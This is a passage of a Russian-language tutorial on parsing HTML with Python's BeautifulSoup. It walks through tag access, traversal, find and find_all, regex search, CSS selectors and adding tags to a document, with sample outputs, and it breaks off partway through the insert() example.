+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">print(soup.h2)
+
+print(soup.head)</pre>
+</div>
+<p><span style="font-weight: 400;">Затем осуществляется вывод HTML-кода тегов </span><i><span style="font-weight: 400;">h2 </span></i><span style="font-weight: 400;">и </span><i><span style="font-weight: 400;">head,</span></i></p>
+<p><strong><i>print(soup.li)</i></strong></p>
+<p><span style="font-weight: 400;">В этом примере многократно используются элементы </span><i><span style="font-weight: 400;">li</span></i><span style="font-weight: 400;">, но выводится лишь только первый из них. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">$ ./simple.py 
+
+&lt;h2&gt;Operating systems&lt;/h2&gt;
+
+&lt;head&gt;
+
+&lt;title&gt;Header&lt;/title&gt;
+
+&lt;meta charset="utf-8"/&gt;
+
+&lt;/head&gt;
+
+&lt;li&gt;Solaris&lt;/li&gt;</pre>
+</div>
+<p><span style="font-weight: 400;">Этот фрагмент – результат вывода.</span></p>
+<h2 id="tegi-atributy-namei-text"><span style="font-weight: 400;">Теги, атрибуты </span><i><span style="font-weight: 400;">name </span></i><span style="font-weight: 400;">и </span><i><span style="font-weight: 400;">text</span></i></h2>
+<p><span style="font-weight: 400;">С помощью атрибута </span><i><span style="font-weight: 400;">name </span></i><span style="font-weight: 400;">мы получаем название тега, а атрибута </span><i><span style="font-weight: 400;">text</span></i><span style="font-weight: 400;"> – его содержимое. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+
+
+
+from bs4 import BeautifulSoup
+
+
+
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+
+
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+
+
+
+    print("HTML: {0}, name: {1}, text: {2}".format(soup.h2, 
+
+        soup.h2.name, soup.h2.text))</pre>
+</div>
+<p><span style="font-weight: 400;">Код в примере дает возможность вывести HTML-код, название и текст </span><i><span style="font-weight: 400;">h2</span></i><span style="font-weight: 400;"> тега. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">$ ./tags_names.py 
+
+HTML: &lt;h2&gt;Operating systems&lt;/h2&gt;, name: h2, text: Operating systems</pre>
+</div>
+<p><span style="font-weight: 400;">Этот результат будет отображен в процессе вывода.</span></p>
+<h2 id="beautifulsoup-perebor-tegov-html"><span style="font-weight: 400;">BeautifulSoup – перебор тегов HTML</span></h2>
+<p><span style="font-weight: 400;">Чтобы выполнить перебор содержимого HTML-документа, используется метод </span><i><span style="font-weight: 400;">recursiveChildGenerator()</span></i><span style="font-weight: 400;">. Работает он следующим образом. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+ 
+
+from bs4 import BeautifulSoup
+
+ 
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+ 
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+            
+
+    for child in soup.recursiveChildGenerator():
+
+        
+
+        if child.name:
+
+            
+
+            print(child.name)</pre>
+</div>
+<p><span style="font-weight: 400;">Этот пример дает возможность выполнить перебор содержимого HTML-документа и вывести названия всех тегов. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">$ ./traverse_tree.py 
+
+html
+
+head
+
+title
+
+meta
+
+body
+
+h2
+
+ul
+
+li
+
+li
+
+li
+
+li
+
+li
+
+p
+
+p</pre>
+</div>
+<p><span style="font-weight: 400;">Эти теги являются составляющими рассматриваемого документа HTML.</span></p>
+<h2 id="beautifulsoup-ispolzovanie-atributa-children"><span style="font-weight: 400;">BeautifulSoup – использование атрибута </span><i><span style="font-weight: 400;">children</span></i></h2>
+<p><span style="font-weight: 400;">С помощью атрибута </span><i><span style="font-weight: 400;">children </span></i><span style="font-weight: 400;">можно вывести все дочерние теги. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+ 
+
+from bs4 import BeautifulSoup
+
+ 
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+ 
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+ 
+
+    root = soup.html
+
+    
+
+    root_childs = [e.name for e in root.children if e.name is not None]
+
+    print(root_childs)</pre>
+</div>
+<p><span style="font-weight: 400;">В приведенном здесь примере извлекаются дочерние элементы </span><i><span style="font-weight: 400;">html</span></i><span style="font-weight: 400;"> тега, после чего они размещаются в список Python и выводятся в консоль. Поскольку атрибут </span><i><span style="font-weight: 400;">children</span></i><span style="font-weight: 400;"> также убирает пробелы между тегами, надо добавить условие, позволяющее выбрать лишь названия тегов. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">$ ./get_children.py 
+
+['head', 'body']</pre>
+</div>
+<p><span style="font-weight: 400;">Следовательно, у тегов html есть два дочерних элемента – </span><i><span style="font-weight: 400;">head</span></i><span style="font-weight: 400;"> и </span><i><span style="font-weight: 400;">body.</span></i></p>
+<h2 id="atribut-descendants"><span style="font-weight: 400;">Атрибут </span><i><span style="font-weight: 400;">descendants</span></i></h2>
+<p><span style="font-weight: 400;">С помощью атрибута </span><i><span style="font-weight: 400;">descendants</span></i><span style="font-weight: 400;"> можно получить список всех потомков (дочерних элементов всех уровней) тега, который рассматривается. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+ 
+
+from bs4 import BeautifulSoup
+
+ 
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+ 
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+ 
+
+    root = soup.body
+
+    
+
+    root_childs = [e.name for e in root.descendants if e.name is not None]
+
+    print(root_childs)</pre>
+</div>
+<p><span style="font-weight: 400;">Этот пример дает возможность отыскать всех потомков главного тега </span><i><span style="font-weight: 400;">body</span></i><span style="font-weight: 400;">. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">$ ./get_descendants.py 
+
+['h2', 'ul', 'li', 'li', 'li', 'li', 'li', 'p', 'p']</pre>
+</div>
+<p><span style="font-weight: 400;">Перечисленные ранее теги – это потомки главного тега </span><i><span style="font-weight: 400;">body</span></i><span style="font-weight: 400;">.</span></p>
+<h2 id="beautifulsoup-i-veb-skraping-html"><span style="font-weight: 400;">BeautifulSoup и веб-скрапинг HTML</span></h2>
+<p><i><span style="font-weight: 400;">Requests – </span></i><span style="font-weight: 400;">это простая библиотека Python, которая позволяет работать с HTTP-запросами. С ее помощью можно использовать целый спектр методов, с помощью которых получают доступ к интернет-ресурсам, используя HTTP. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+
+
+
+from bs4 import BeautifulSoup
+
+import requests as req
+
+    
+
+resp = req.get("http://www.something.com")
+
+
+
+
+soup = BeautifulSoup(resp.text, 'lxml')
+
+
+
+
+print(soup.title)
+
+print(soup.title.text)
+
+print(soup.title.parent)</pre>
+</div>
+<p><span style="font-weight: 400;">Этот пример показывает, как происходит извлечение имени веб-страницы. Здесь также выводится имя ее родителя. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">Python
+
+resp = req.get("http://www.something.com")
+
+ 
+
+soup = BeautifulSoup(resp.text, 'lxml')
+
+
+
+
+Здесь мы получаем данные о самой странице.
+
+
+
+
+Python
+
+print(soup.title)
+
+print(soup.title.text)
+
+print(soup.title.parent)</pre>
+</div>
+<p><span style="font-weight: 400;">Вышеприведенный код помогает вывести HTML-код заголовка, его текст, а также HTML-код его родителя. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">$ ./scraping.py 
+
+&lt;title&gt;Something.&lt;/title&gt;
+
+Something.
+
+&lt;head&gt;&lt;title&gt;Something.&lt;/title&gt;&lt;/head&gt;</pre>
+</div>
+<p><span style="font-weight: 400;">Это результат вывода.</span></p>
+<h2 id="metod-prettify"><span style="font-weight: 400;">Метод </span><i><span style="font-weight: 400;">prettify()</span></i></h2>
+<p><span style="font-weight: 400;">С помощью метода </span><i><span style="font-weight: 400;">prettify()</span></i><span style="font-weight: 400;"> можно добиться того, чтобы код выглядел более красиво. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+
+
+
+from bs4 import BeautifulSoup
+
+import requests as req
+
+    
+
+resp = req.get("http://www.something.com")
+
+
+
+
+soup = BeautifulSoup(resp.text, 'lxml')
+
+
+
+
+print(soup.prettify())</pre>
+</div>
+<p><span style="font-weight: 400;">Так, мы выполняем оптимизацию HTML-кода простой веб-страницы. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">Shell
+
+$ ./prettify.py 
+
+&lt;html&gt;
+
+ &lt;head&gt;
+
+  &lt;title&gt;
+
+   Something.
+
+  &lt;/title&gt;
+
+ &lt;/head&gt;
+
+ &lt;body&gt;
+
+  Something.
+
+ &lt;/body&gt;
+
+&lt;/html&gt;</pre>
+</div>
+<p><span style="font-weight: 400;">После того, как мы запустили вышеприведенную программу, получили такой результат.</span></p>
+<h2 id="metod-find-poisk-elementov-po-aydi"><span style="font-weight: 400;">Метод </span><i><span style="font-weight: 400;">find()</span></i><span style="font-weight: 400;">, поиск элементов по айди</span></h2>
+<p><span style="font-weight: 400;">Метод </span><i><span style="font-weight: 400;">find()</span></i><span style="font-weight: 400;"> дает возможность найти элементы страницы, пользуясь целым спектром опорных параметров, включая </span><i><span style="font-weight: 400;">id</span></i><span style="font-weight: 400;">. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+ 
+
+from bs4 import BeautifulSoup
+
+ 
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+ 
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+ 
+
+    #print(soup.find("ul", attrs={ "id" : "mylist"}))
+
+    print(soup.find("ul", id="mylist"))</pre>
+</div>
+<p><span style="font-weight: 400;">В этом примере код находит тег </span><i><span style="font-weight: 400;">ul</span></i><span style="font-weight: 400;">, у которого </span><i><span style="font-weight: 400;">id mylist</span></i><span style="font-weight: 400;">. Строка в комментарии описывает альтернативный вариант, как выполняется аналогичное задание.</span></p>
+<h2 id="poisk-vseh-tegov"><span style="font-weight: 400;">Поиск всех тегов</span></h2>
+<p><span style="font-weight: 400;">Для реализации этой задачи используется метод </span><i><span style="font-weight: 400;">find_all()</span></i><span style="font-weight: 400;">. С его помощью можно найти все элементы, которые подходят под заданные условия. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+ 
+
+from bs4 import BeautifulSoup
+
+ 
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+ 
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+ 
+
+    for tag in soup.find_all("li"):
+
+        print("{0}: {1}".format(tag.name, tag.text))</pre>
+</div>
+<p><span style="font-weight: 400;">В этом примере код ищет и выводит на экран все теги </span><i><span style="font-weight: 400;">li. </span></i></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">$ ./find_all.py 
+
+li: Solaris
+
+li: FreeBSD
+
+li: Debian
+
+li: NetBSD</pre>
+</div>
+<p><span style="font-weight: 400;">А это результат вывода приложения, которое приведено только что.</span></p>
+<p><span style="font-weight: 400;">Метод </span><i><span style="font-weight: 400;">find_all()</span></i><span style="font-weight: 400;"> также используется в процессе поиска список из названий тегов. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+ 
+
+from bs4 import BeautifulSoup
+
+ 
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+ 
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+ 
+
+    tags = soup.find_all(['h2', 'p'])
+
+    
+
+    for tag in tags:
+
+        print(" ".join(tag.text.split()))</pre>
+</div>
+<p><span style="font-weight: 400;">В этом примере видно, как осуществляется поиск элементов с тегами </span><i><span style="font-weight: 400;">h2 </span></i><span style="font-weight: 400;">и </span><i><span style="font-weight: 400;">p</span></i><span style="font-weight: 400;">, а потом их содержимое отображается на экране.</span></p>
+<p><span style="font-weight: 400;">С помощью метода </span><i><span style="font-weight: 400;">find_all()</span></i><span style="font-weight: 400;"> также можно определять, какие элементы должны быть выведены на экран. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+ 
+
+from bs4 import BeautifulSoup
+
+ 
+
+def myfun(tag):
+
+    
+
+    return tag.is_empty_element
+
+ 
+
+ 
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+ 
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+ 
+
+    tags = soup.find_all(myfun)
+
+    print(tags)</pre>
+</div>
+<p><span style="font-weight: 400;">Так, с помощью этого примера выводятся исключительно пустые элементы. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">$ ./find_by_fun.py 
+
+[&lt;meta charset="utf-8"/&gt;]</pre>
+</div>
+<p><span style="font-weight: 400;">В случае с вышеприведенным документом, единственный пустой элемент в документе – это </span><i><span style="font-weight: 400;">meta</span></i><span style="font-weight: 400;">.</span></p>
+<p><span style="font-weight: 400;">Помимо этого, всегда можно найти запрашиваемые элементы с помощью регулярных выражений. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+
+
+
+import re
+
+
+
+
+from bs4 import BeautifulSoup
+
+
+
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+
+
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+
+
+
+    strings = soup.find_all(string=re.compile('BSD'))
+
+    
+
+    for txt in strings:
+
+        
+
+        print(" ".join(txt.split()))
+
+#!/usr/bin/python3
+
+ 
+
+import re
+
+ 
+
+from bs4 import BeautifulSoup
+
+ 
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+ 
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+ 
+
+    strings = soup.find_all(string=re.compile('BSD'))
+
+    
+
+    for txt in strings:
+
+        
+
+        print(" ".join(txt.split()))</pre>
+</div>
+<p><span style="font-weight: 400;">В этом примере отображается содержимое элементов, в каких есть строка с символами </span><i><span style="font-weight: 400;">‘BSD’</span></i><span style="font-weight: 400;">. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">$ ./regex.py 
+
+FreeBSD
+
+NetBSD
+
+FreeBSD is an advanced computer operating system used to power modern servers, desktops, and embedded platforms.</pre>
+</div>
+<p><span style="font-weight: 400;">Это результат вывода.</span></p>
+<h2 id="ispolzovanie-metodov-select-i-select_one"><span style="font-weight: 400;">Использование методов </span><i><span style="font-weight: 400;">select()</span></i><span style="font-weight: 400;"> и </span><i><span style="font-weight: 400;">select_one()</span></i></h2>
+<p><span style="font-weight: 400;">С использованием методов </span><i><span style="font-weight: 400;">select()</span></i><span style="font-weight: 400;"> и </span><i><span style="font-weight: 400;">select_one()</span></i><span style="font-weight: 400;"> возможно задействование ряда </span><i><span style="font-weight: 400;">CSS-селекторов</span></i><span style="font-weight: 400;">. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+
+
+
+from bs4 import BeautifulSoup
+
+
+
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+
+
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+
+
+
+    print(soup.select("li:nth-of-type(3)"))</pre>
+</div>
+<p><span style="font-weight: 400;">В этом примере используется </span><i><span style="font-weight: 400;">CSS-селектор</span></i><span style="font-weight: 400;">, выводящий на экран HTML-код элемента списка, который будет расположен третьим по счету. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">$ ./select_nth_tag.py 
+
+&lt;li&gt;Debian&lt;/li&gt;</pre>
+</div>
+<p><span style="font-weight: 400;">Именно этот элемент является третьим в списке.</span></p>
+<p><span style="font-weight: 400;">В CSS символ решетки отвечает за выбор тегов по </span><i><span style="font-weight: 400;">id</span></i><span style="font-weight: 400;">. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+ 
+
+from bs4 import BeautifulSoup
+
+ 
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+ 
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+ 
+
+    print(soup.select_one("#mylist"))</pre>
+</div>
+<p><span style="font-weight: 400;">Этот пример позволяет отображать элементы, у которых есть </span><i><span style="font-weight: 400;">id</span></i><span style="font-weight: 400;"> с названием </span><i><span style="font-weight: 400;">mylist</span></i><span style="font-weight: 400;">.</span></p>
+<h2 id="beautifulsoup-ispolzovanie-metoda-append"><span style="font-weight: 400;">BeautifulSoup – использование метода </span><i><span style="font-weight: 400;">append()</span></i></h2>
+<p><span style="font-weight: 400;">С помощью этого метода программа добавляет в HTML-документ новый тег. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+ 
+
+from bs4 import BeautifulSoup
+
+ 
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+ 
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+ 
+
+    newtag = soup.new_tag('li')
+
+    newtag.string='OpenBSD'
+
+ 
+
+    ultag = soup.ul
+
+    
+
+    ultag.append(newtag)
+
+    
+
+    print(ultag.prettify())</pre>
+</div>
+<p><span style="font-weight: 400;">В приведенном выше примере отображается, как добавить новый элемент </span><i><span style="font-weight: 400;">li</span></i><span style="font-weight: 400;">. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">newtag = soup.new_tag('li')
+
+newtag.string='OpenBSD'</pre>
+</div>
+<p><span style="font-weight: 400;">Сперва, надо создать новый тег, используя метод </span><i><span style="font-weight: 400;">new_tag()</span></i><span style="font-weight: 400;">. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">ultag = soup.ul.</pre>
+</div>
+<p><span style="font-weight: 400;">Затем необходимо сделать сноску на тег </span><i><span style="font-weight: 400;">ul</span></i><span style="font-weight: 400;">. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">ultag.append(newtag)</pre>
+</div>
+<p><span style="font-weight: 400;">Потом тег </span><i><span style="font-weight: 400;">li</span></i><span style="font-weight: 400;">, который создан на предыдущем этапе, добавляется к тегу </span><i><span style="font-weight: 400;">ul</span></i><span style="font-weight: 400;">. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">print(ultag.prettify())</pre>
+</div>
+<p><span style="font-weight: 400;">В результате, у нас получилось добиться идеального форматирования тега </span><i><span style="font-weight: 400;">ul</span></i><span style="font-weight: 400;">.</span></p>
+<h2 id="metod-insert-vstavka-html-tega"><span style="font-weight: 400;">Метод insert()</span> <span style="font-weight: 400;">– вставка HTML-тега</span></h2>
+<p><span style="font-weight: 400;">С помощью метода </span><i><span style="font-weight: 400;">insert() </span></i><span style="font-weight: 400;">можно выбирать определенное место и вставлять туда определенный элемент. Работает это следующим образом. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+ 
+
+from bs4 import BeautifulSoup
+
+ 
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+ 
+
+    soup = BeautifulSoup(contents, 'lxml')
+
